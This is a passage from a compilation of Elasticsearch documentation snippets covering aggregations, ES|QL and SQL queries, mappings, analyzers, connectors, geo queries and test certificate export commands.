}\n}\n```\n\n----------------------------------------\n\nTITLE: GeoTile Grid with Bounding Box in Elasticsearch\nDESCRIPTION: Shows how to constrain geotile_grid aggregation to a specific geographic bounding box with high precision tiling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"tile\": {\n              \"geotile_grid\": {\n                \"field\": \"location\",\n                \"precision\": 22,\n                \"bounds\": {\n                  \"top_left\": \"POINT (4.9 52.4)\",\n                  \"bottom_right\": \"POINT (5.0 52.3)\"\n                }\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Nested Aggregation with Date Histogram\nDESCRIPTION: Complex example showing how to combine date_histogram with categorize_text and top_hits aggregations for temporal analysis of categories.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST log-messages/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"daily\": {\n      \"date_histogram\": {\n        \"field\": \"time\",\n        \"fixed_interval\": \"1d\"\n      },\n      \"aggs\": {\n        \"categories\": {\n          \"categorize_text\": {\n            \"field\": \"message\",\n            \"categorization_filters\": [\"\\\\w+\\\\_\\\\d{3}\"]\n          },\n          \"aggs\": {\n            \"hit\": {\n              \"top_hits\": {\n                \"size\": 1,\n                \"sort\": [\"time\"],\n                \"_source\": \"message\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Copying Field Values with Template Snippets\nDESCRIPTION: Example demonstrating how to copy values between fields using template snippets in the Set processor pipeline configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/set-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/set_os\n{\n  \"description\": \"sets the value of host.os.name from the field os\",\n  \"processors\": [\n    {\n      \"set\": {\n        \"field\": \"host.os.name\",\n        \"value\": \"{{{os}}}\"\n      }\n    }\n  ]\n}\n\nPOST _ingest/pipeline/set_os/_simulate\n{\n  \"docs\": [\n    {\n      \"_source\": {\n        \"os\": \"Ubuntu\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ES|QL String Literals\nDESCRIPTION: Shows how to use string literals in filtering operations using double quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\n// Filter by a string value\nFROM index\n| WHERE first_name == \"Georgi\"\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with Time Zone in Elasticsearch\nDESCRIPTION: This example shows how to use the 'time_zone' parameter in a date histogram aggregation to adjust bucketing based on a specific time zone.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"date\": \"2015-10-01T00:30:00Z\"\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"date\": \"2015-10-01T01:30:00Z\"\n}\n\nGET my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"by_day\": {\n      \"date_histogram\": {\n        \"field\":     \"date\",\n        \"calendar_interval\":  \"day\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"by_day\": {\n      \"buckets\": [\n        {\n          \"key_as_string\": \"2015-10-01T00:00:00.000Z\",\n          \"key\":           1443657600000,\n          \"doc_count\":     2\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT BBOX in Elasticsearch\nDESCRIPTION: Example of indexing a WKT BBOX (bounding box) in Elasticsearch. This represents the same geometry as the Envelope example but using WKT syntax, with parameter order: minLon, maxLon, maxLat, minLat.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_19\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"BBOX (100.0, 102.0, 2.0, 0.0)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using Wildcards and Field Boosts in Simple Query String\nDESCRIPTION: This snippet showcases querying with wildcards and boosting field relevance using the caret notation. It emphasizes multi-field search capabilities with boosted scores for specific fields, without any prerequisites other than an Elasticsearch instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-simple-query-string-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\" : {\n      \"query\":    \"Will Smith\",\n      \"fields\": [ \"title\", \"*_name\" ] <1>\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\" : {\n      \"query\" : \"this is a test\",\n      \"fields\" : [ \"subject^3\", \"message\" ] <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Making Routing Value Required in Elasticsearch Mapping\nDESCRIPTION: Example of configuring an index to require a routing value for all document operations by setting _routing.required to true in the mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000002\n{\n  \"mappings\": {\n    \"_routing\": {\n      \"required\": true <1>\n    }\n  }\n}\n\nPUT my-index-000002/_doc/1 <2>\n{\n  \"text\": \"No routing value provided\"\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Aggregation Response with _doc_count in Elasticsearch\nDESCRIPTION: This snippet shows the response from the terms aggregation, where the doc_count values reflect the _doc_count values from the indexed documents (62 and 45) rather than counting each document as 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-doc-count-field.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n    ...\n    \"aggregations\" : {\n        \"histogram_titles\" : {\n            \"doc_count_error_upper_bound\": 0,\n            \"sum_other_doc_count\": 0,\n            \"buckets\" : [\n                {\n                    \"key\" : \"histogram_2\",\n                    \"doc_count\" : 62\n                },\n                {\n                    \"key\" : \"histogram_1\",\n                    \"doc_count\" : 45\n                }\n            ]\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying with BUCKET Time Spans in ESQL\nDESCRIPTION: Example showing how to use time spans with the BUCKET function to group employee hire dates by week intervals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, 1 week)\n| SORT week\n```\n\n----------------------------------------\n\nTITLE: Creating Azure Blob Storage Connector via Elasticsearch API\nDESCRIPTION: API call to create a new self-managed Azure Blob Storage connector in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-azure_blob_storage-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Azure Blob Storage\",\n  \"service_type\": \"azure_blob_storage\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Slack Connector using the API - Console - Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a new Slack connector using the Elasticsearch Create connector API. It specifies the index name, connector name, and service type as part of the request payload.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-slack.md#2025-04-21_snippet_0\n\nLANGUAGE: Console\nCODE:\n```\nPUT _connector/my-slack-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Slack\",\n  \"service_type\": \"slack\"\n}\n```\n\n----------------------------------------\n\nTITLE: Context Mapping for Completion Suggester in Elasticsearch\nDESCRIPTION: Demonstrates how to configure context mappings for a completion field to enable filtering or boosting of suggestions based on category or geographic location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nPUT place\n{\n  \"mappings\": {\n    \"properties\": {\n      \"suggest\": {\n        \"type\": \"completion\",\n        \"contexts\": [\n          {                                 <1>\n            \"name\": \"place_type\",\n            \"type\": \"category\"\n          },\n          {                                 <2>\n            \"name\": \"location\",\n            \"type\": \"geo\",\n            \"precision\": 4\n          }\n        ]\n      }\n    }\n  }\n}\nPUT place_path_category\n{\n  \"mappings\": {\n    \"properties\": {\n      \"suggest\": {\n        \"type\": \"completion\",\n        \"contexts\": [\n          {                           <3>\n            \"name\": \"place_type\",\n            \"type\": \"category\",\n            \"path\": \"cat\"\n          },\n          {                           <4>\n            \"name\": \"location\",\n            \"type\": \"geo\",\n            \"precision\": 4,\n            \"path\": \"loc\"\n          }\n        ]\n      },\n      \"loc\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Queries Using Logical Operators in YAML\nDESCRIPTION: This snippet showcases the combination of multiple KQL queries using logical operators like 'and' and 'or'. It also demonstrates the use of parentheses to determine precedence and shorthand syntax for multiple values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.method: GET OR http.response.status_code: 400\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.method: GET AND http.response.status_code: 400\n```\n\nLANGUAGE: yaml\nCODE:\n```\n(http.request.method: GET AND http.response.status_code: 200) OR\n(http.request.method: POST AND http.response.status_code: 400)\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.method: (GET OR POST OR DELETE)\n```\n\n----------------------------------------\n\nTITLE: Using Synthetic _source with Date Fields in Elasticsearch\nDESCRIPTION: Example showing how synthetic _source handles date fields, specifically how it sorts date field values. The example creates an index with synthetic source enabled and inserts a document with an array of dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"date\": { \"type\": \"date\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"date\": [\"2015-01-01T12:10:30Z\", \"2014-01-01T12:10:30Z\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with Remove Duplicates Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the create index API to configure a new custom analyzer that incorporates the remove_duplicates filter along with keyword_repeat and stemmer filters. This setup creates stemmed and unstemmed versions of each token and then removes any duplicates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-remove-duplicates-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_custom_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"keyword_repeat\",\n            \"stemmer\",\n            \"remove_duplicates\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Current DateTime with NOW in SQL\nDESCRIPTION: Returns the current timestamp when the query is executed. This function returns the same value for all occurrences in a query. Used for relative date/time filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_63\n\nLANGUAGE: sql\nCODE:\n```\n\"NOW()\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT NOW() AS result;\\n\\n         result\\n------------------------\\n2018-12-12T14:48:52.448Z\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT first_name FROM emp WHERE hire_date > NOW() - INTERVAL 100 YEARS ORDER BY first_name ASC LIMIT 5;\\n\\n  first_name\\n---------------\\nAlejandro\\nAmabile\\nAnneke\\nAnoosh\\nArumugam\\n\"\n```\n\n----------------------------------------\n\nTITLE: Converting String Values to Datetime using TO_DATETIME in ESQL\nDESCRIPTION: This example demonstrates converting a multi-valued string field to datetime objects. When a string value doesn't match the expected date format, it results in a null value and adds warning headers to the response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW string = [\"1953-09-02T00:00:00.000Z\", \"1964-06-02T00:00:00.000Z\", \"1964-06-02 00:00:00\"]\n| EVAL datetime = TO_DATETIME(string)\n```\n\n----------------------------------------\n\nTITLE: Converting Degrees to Radians using TO_RADIANS in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TO_RADIANS function in ESQL. It creates a row with a 'deg' column containing degree values, then uses the EVAL clause to apply the TO_RADIANS function to convert these values to radians, storing the result in a new 'rad' column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_radians.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW deg = [90.0, 180.0, 270.0]\n| EVAL rad = TO_RADIANS(deg)\n```\n\n----------------------------------------\n\nTITLE: DATE_PARSE Example: Parse Date\nDESCRIPTION: Demonstrates parsing a date string using DATE_PARSE with a given format. This example shows how to convert a string in 'dd/MM/yyyy' format into a date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_40\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_PARSE('07/04/2020', 'dd/MM/yyyy') AS \\\"date\\\";\\n\\n   date\n-----------\n2020-04-07\"\n```\n\n----------------------------------------\n\nTITLE: Converting String to Version Value in ESQL\nDESCRIPTION: The TO_VERSION function takes a string representation of a version number and converts it to a version value. This example demonstrates how to use the function to convert the string \"1.2.3\" to a version value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_version.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW v = TO_VERSION(\"1.2.3\")\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Elasticsearch Aggregations\nDESCRIPTION: This snippet shows how to handle missing values in Elasticsearch aggregations. It uses the 'missing' parameter to specify a default value for documents that don't have the aggregated field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"grade_percentiles\": {\n      \"percentiles\": {\n        \"field\": \"grade\",\n        \"missing\": 10       <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Character Group Tokenizer in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the char_group tokenizer to analyze text by splitting on whitespace, hyphens, and newlines. The tokenizer breaks \"The QUICK brown-fox\" into four separate tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-chargroup-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": {\n    \"type\": \"char_group\",\n    \"tokenize_on_chars\": [\n      \"whitespace\",\n      \"-\",\n      \"\\n\"\n    ]\n  },\n  \"text\": \"The QUICK brown-fox\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"The\",\n      \"start_offset\": 0,\n      \"end_offset\": 3,\n      \"type\": \"word\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"QUICK\",\n      \"start_offset\": 4,\n      \"end_offset\": 9,\n      \"type\": \"word\",\n      \"position\": 1\n    },\n    {\n      \"token\": \"brown\",\n      \"start_offset\": 10,\n      \"end_offset\": 15,\n      \"type\": \"word\",\n      \"position\": 2\n    },\n    {\n      \"token\": \"fox\",\n      \"start_offset\": 16,\n      \"end_offset\": 19,\n      \"type\": \"word\",\n      \"position\": 3\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Clearing Multiple Scroll Contexts in Elasticsearch\nDESCRIPTION: This snippet shows how to clear multiple scroll contexts at once by passing an array of scroll_ids to the clear-scroll API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_search/scroll\n{\n  \"scroll_id\" : [\n    \"DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAAD4WYm9laVYtZndUQlNsdDcwakFMNjU1QQ==\",\n    \"DnF1ZXJ5VGhlbkZldGNoBQAAAAAAAAABFmtSWWRRWUJrU2o2ZExpSGJCVmQxYUEAAAAAAAAAAxZrUllkUVlCa1NqNmRMaUhiQlZkMWFBAAAAAAAAAAIWa1JZZFFZQmtTajZkTGlIYkJWZDFhQQAAAAAAAAAFFmtSWWRRWUJrU2o2ZExpSGJCVmQxYUEAAAAAAAAABBZrUllkUVlCa1NqNmRMaUhiQlZkMWFB\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Track Scores with Sorting in Elasticsearch\nDESCRIPTION: Shows how to maintain score computation when sorting by enabling track_scores parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"track_scores\": true,\n  \"sort\" : [\n    { \"post_date\" : {\"order\" : \"desc\"} },\n    { \"name\" : \"desc\" },\n    { \"age\" : \"desc\" }\n  ],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Documents with TERM Function in ESQL\nDESCRIPTION: Example demonstrating how to use the TERM function to filter documents by exact term matches. The query searches for books where the author field contains the exact term \"gabriel\" and returns the matching book records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/term.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE TERM(author, \"gabriel\")\n```\n\n----------------------------------------\n\nTITLE: Generating Certificates from Keystores in Elasticsearch\nDESCRIPTION: These commands export certificates from the previously created keystores for both server and client. The certificates are saved as separate files (server.crt and client.crt) using the respective aliases and passwords.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/sql-client/src/test/resources/ssl/readme.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -export -alias server -file server.crt -keystore server.keystore -storepass password\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -export -alias client -file client.crt -keystore client.keystore -storepass password\n```\n\n----------------------------------------\n\nTITLE: Missing Value Date Histogram Example\nDESCRIPTION: Example showing how to handle missing values in date histogram aggregation by assigning them a default date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sale_date\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"year\",\n        \"missing\": \"2000/01/01\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monthly Bucketing with Target Count in ESQL\nDESCRIPTION: Creates monthly buckets for hire dates over a year period, targeting 20 buckets maximum. Demonstrates the automatic bucket size calculation mode with date values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hire_date = MV_SORT(VALUES(hire_date)) BY month = BUCKET(hire_date, 20, \"1985-01-01T00:00:00Z\", \"1986-01-01T00:00:00Z\")\n```\n\n----------------------------------------\n\nTITLE: Simple Query String Syntax Example\nDESCRIPTION: Illustrates using simple query string syntax with predefined operators to search documents. Special characters like '+', '|', and '-' specify logical operations. It showcases the effect of default operators on query results, requiring no additional prerequisites.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-simple-query-string-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\": {\n      \"fields\": [ \"content\" ],\n      \"query\": \"foo bar -baz\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Constant Score with Filter Query in Elasticsearch\nDESCRIPTION: This query demonstrates using a `constant_score` query with a `filter` clause. This assigns a constant score of `1.0` to all documents that match the filter. In this case, it returns all documents where `status` is `active`, each with a score of `1.0`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"term\": {\n          \"status\": \"active\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Role Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Specifies the structure of a role object in security configuration change events. It includes fields for the role name, cluster privileges, global privileges, index privileges, application privileges, run-as privileges, and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\n{\"name\": <string>, \"role_descriptor\": {\"cluster\": <string_list>, \"global\":\n{\"application\":{\"manage\":{<string>:<string_list>}}}, \"indices\": [                             {\"names\": <string_list>, \"privileges\": <string_list>, \"field_security\":\n{\"grant\": <string_list>, \"except\": <string_list>}, \"query\": <string>,\n\"allow_restricted_indices\": <boolean>}], \"applications\":[{\"application\": <string>,\n\"privileges\": <string_list>, \"resources\": <string_list>}], \"run_as\": <string_list>,\n\"metadata\": <object>}}\n```\n\n----------------------------------------\n\nTITLE: Setting up Parent/Child Relationships with Join Field Type in Elasticsearch\nDESCRIPTION: This example shows how to configure a parent/child relationship using the join field type in Elasticsearch. It defines a relation between 'my_parent' and 'my_child', indexes both a parent and child document with proper routing, and demonstrates querying parent documents that have matching children.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_join_field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"my_parent\": \"my_child\"\n        }\n      }\n    }\n  }\n}\n\nPUT test/_doc/1?refresh\n{\n  \"number\": 1,\n  \"my_join_field\": \"my_parent\"\n}\n\nPUT test/_doc/2?routing=1&refresh\n{\n  \"number\": 1,\n  \"my_join_field\": {\n    \"name\": \"my_child\",\n    \"parent\": \"1\"\n  }\n}\n\nPOST test/_search\n{\n  \"query\": {\n    \"has_child\": {\n      \"type\": \"my_child\",\n      \"query\": {\n        \"match\": {\n          \"number\": 1\n        }\n      },\n      \"inner_hits\": {}    <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Stats Aggregation on Exam Grades in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the stats aggregation to compute statistics on exam grades. It calculates min, max, sum, count, and average of the 'grade' field across all documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-stats-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST /exams/_search?size=0\n{\n  \"aggs\": {\n    \"grades_stats\": { \"stats\": { \"field\": \"grade\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Search-as-You-Type with Edge N-gram in Elasticsearch\nDESCRIPTION: Complete example of setting up a search-as-you-type field using edge_ngram tokenizer for indexing and a different analyzer for searching. Includes creating an index, configuring analyzers, indexing a document, and executing a search.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"autocomplete\": {\n          \"tokenizer\": \"autocomplete\",\n          \"filter\": [\n            \"lowercase\"\n          ]\n        },\n        \"autocomplete_search\": {\n          \"tokenizer\": \"lowercase\"\n        }\n      },\n      \"tokenizer\": {\n        \"autocomplete\": {\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 2,\n          \"max_gram\": 10,\n          \"token_chars\": [\n            \"letter\"\n          ]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"title\": {\n        \"type\": \"text\",\n        \"analyzer\": \"autocomplete\",\n        \"search_analyzer\": \"autocomplete_search\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"title\": \"Quick Foxes\"\n}\n\nPOST my-index-000001/_refresh\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"title\": {\n        \"query\": \"Quick Fo\",\n        \"operator\": \"and\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Stored Fields in Elasticsearch Mapping\nDESCRIPTION: This example demonstrates how to configure certain fields to be stored separately from the _source field. The mapping defines 'title' and 'date' as stored fields, while 'content' remains unstored. It shows how to index a document and then retrieve only the stored fields using the stored_fields parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-store.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"title\": {\n        \"type\": \"text\",\n        \"store\": true <1>\n      },\n      \"date\": {\n        \"type\": \"date\",\n        \"store\": true <1>\n      },\n      \"content\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"title\":   \"Some short title\",\n  \"date\":    \"2015-01-01\",\n  \"content\": \"A very long content field...\"\n}\n\nGET my-index-000001/_search\n{\n  \"stored_fields\": [ \"title\", \"date\" ] <2>\n}\n```\n\n----------------------------------------\n\nTITLE: Querying geo_point data with geo_distance filter in Elasticsearch\nDESCRIPTION: This snippet shows how to use the `geo_distance` filter to search for `geo_point` values within a specified distance of a given geopoint in Elasticsearch.  It uses a bool query with a `match_all` clause and a `geo_distance` filter to find documents within 200km of latitude 40 and longitude -70.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"200km\",\n          \"pin.location\": {\n            \"lat\": 40,\n            \"lon\": -70\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Sparse Vector Query with NLP Model\nDESCRIPTION: Demonstrates a basic sparse vector query using an inference model to convert query text into token-weight pairs for semantic search\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n   \"query\":{\n      \"sparse_vector\": {\n        \"field\": \"ml.tokens\",\n        \"inference_id\": \"the inference ID to produce the token weights\",\n        \"query\": \"the query string\"\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-distance query with Geohash in Elasticsearch\nDESCRIPTION: This snippet showcases the use of the `geo_distance` filter with a Geohash string specified within the `pin.location` field. The query searches for documents within a 12km radius of the location represented by the Geohash.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"12km\",\n          \"pin.location\": \"drm3btev3e86\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Gaussian Decay Function for Location Scoring in Elasticsearch\nDESCRIPTION: This snippet shows how to implement a 